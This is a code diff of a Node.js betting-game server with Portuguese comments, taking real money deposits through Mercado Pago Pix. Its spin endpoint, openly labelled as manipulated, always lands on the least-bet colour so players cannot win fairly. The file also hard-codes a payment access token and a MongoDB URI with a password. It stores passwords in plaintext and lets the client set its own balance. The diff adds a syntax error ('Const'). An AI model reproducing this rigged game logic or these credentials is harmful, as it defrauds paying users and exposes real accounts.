@@ -1,4 +1,4 @@
-const express = require('express');
+Const express = require('express');
 const path = require('path');
 const mongoose = require('mongoose');
 const https = require('https');
@@ -7,7 +7,7 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// TOKEN E MONGO
+// TOKEN E MONGO QUE VOCÊ JÁ USA
 const MP_TOKEN = "APP_USR-480319563212549-011210-80973eae502f42ff3dfbc0cb456aa930-485513741".trim();
 const MONGO_URI = "mongodb+srv://SlotReal:A1l9a9n7@cluster0.ap7q4ev.mongodb.net/SlotGame?retryWrites=true&w=majority";
 
@@ -22,13 +22,8 @@ const User = mongoose.models.User || mongoose.model('User', new mongoose.Schema(
     bets: { type: [Number], default: [0,0,0,0,0,0,0,0,0,0] }
 }));
 
-// Timer global sincronizado
 let t = 120;
-setInterval(() => { 
-    if(t > 0) t--; 
-    else t = 120; 
-}, 1000);
-
+setInterval(() => { if(t > 0) t--; else t = 120; }, 1000);
 app.get('/api/tempo-real', (req, res) => res.json({ segundos: t }));
 
 app.post('/auth/login', async (req, res) => {
@@ -39,63 +34,37 @@ app.post('/auth/login', async (req, res) => {
 
 app.post('/auth/register', async (req, res) => {
     try {
-        const novo = await User.create({ 
-            user: req.body.user, 
-            pass: req.body.pass, 
-            email: req.body.email,
-            saldo: 0,
-            ganhos: 0,
-            bets: [0,0,0,0,0,0,0,0,0,0]
-        });
-        res.json({ success: true, user: novo.user, saldo: 0, ganhos: 0, bets: novo.bets });
+        const novo = await User.create({ user: req.body.user, pass: req.body.pass, email: req.body.email });
+        res.json({ success: true, user: novo.user, saldo: 0, ganhos: 0, bets: [0,0,0,0,0,0,0,0,0,0] });
     } catch (e) { res.json({ success: false, message: "Usuário já existe" }); }
 });
 
 app.post('/api/save-saldo', async (req, res) => {
-    // Garante que o saldo seja salvo como número com 2 casas decimais
-    const saldoFormatado = Number(parseFloat(req.body.saldo).toFixed(2));
-    await User.findOneAndUpdate({ user: req.body.user }, { saldo: saldoFormatado, bets: req.body.bets });
+    await User.findOneAndUpdate({ user: req.body.user }, { saldo: req.body.saldo, bets: req.body.bets });
     res.json({ success: true });
 });
 
-// SPIN MANIPULADO: Lógica de Menor Aposta
+// SPIN MANIPULADO: SEMPRE CAI NO MENOS APOSTADO
 app.post('/api/spin', async (req, res) => {
     try {
         const u = await User.findOne({ user: req.body.user });
         if (!u) return res.json({ success: false });
 
-        // Acha a cor com menos apostas para a casa nunca perder
         let menorValor = Math.min(...u.bets);
         let coresPossiveis = [];
         u.bets.forEach((v, i) => { if (v === menorValor) coresPossiveis.push(i); });
 
         const alvo = coresPossiveis[Math.floor(Math.random() * coresPossiveis.length)];
-        
-        // Multiplicador de 5x (Ajustável aqui)
         const ganho = u.bets[alvo] * 5;
         const nS = Number((u.saldo + ganho).toFixed(2));
         const nG = Number((u.ganhos + ganho).toFixed(2));
 
-        // Zera as apostas após o giro
-        await User.findOneAndUpdate(
-            { user: u.user }, 
-            { saldo: nS, ganhos: nG, bets: [0,0,0,0,0,0,0,0,0,0] }
-        );
-
-        // Envia os dados que o seu novo HTML espera para o delay e modal
-        res.json({ 
-            success: true, 
-            corAlvo: alvo, 
-            novoSaldo: nS, 
-            novoGanhos: nG, 
-            valorGanho: ganho 
-        });
-    } catch (e) { 
-        console.log("Erro no Spin:", e);
-        res.json({ success: false }); 
-    }
+        await User.findOneAndUpdate({ user: u.user }, { saldo: nS, ganhos: nG, bets: [0,0,0,0,0,0,0,0,0,0] });
+        res.json({ success: true, corAlvo: alvo, novoSaldo: nS, novoGanhos: nG, valorGanho: ganho });
+    } catch (e) { res.json({ success: false }); }
 });
 
+// ROTA DO QR CODE RESTAURADA (A QUE FUNCIONAVA)
 app.post('/gerar-pix', (req, res) => {
     const postData = JSON.stringify({
         transaction_amount: Number(req.body.valor),
@@ -125,6 +94,7 @@ app.post('/gerar-pix', (req, res) => {
         mpRes.on('end', () => {
             try {
                 const r = JSON.parse(b);
+                // ESSA É A ESTRUTURA QUE O MERCADO PAGO ENVIA QUANDO DÁ CERTO
                 if (r.point_of_interaction && r.point_of_interaction.transaction_data) {
                     res.json({ 
                         success: true, 
@@ -132,9 +102,11 @@ app.post('/gerar-pix', (req, res) => {
                         copia_e_cola: r.point_of_interaction.transaction_data.qr_code 
                     });
                 } else {
-                    res.json({ success: false, message: "Erro no Mercado Pago" });
+                    res.json({ success: false, message: "Erro no MP" });
                 }
-            } catch(e) { res.json({ success: false }); }
+            } catch(e) { 
+                res.json({ success: false }); 
+            }
         });
     });
     
@@ -143,4 +115,4 @@ app.post('/gerar-pix', (req, res) => {
     mpReq.end();
 });
 
-app.listen(process.env.PORT || 10000, () => console.log("🚀 Servidor rodando"));
+app.listen(process.env.PORT || 10000);
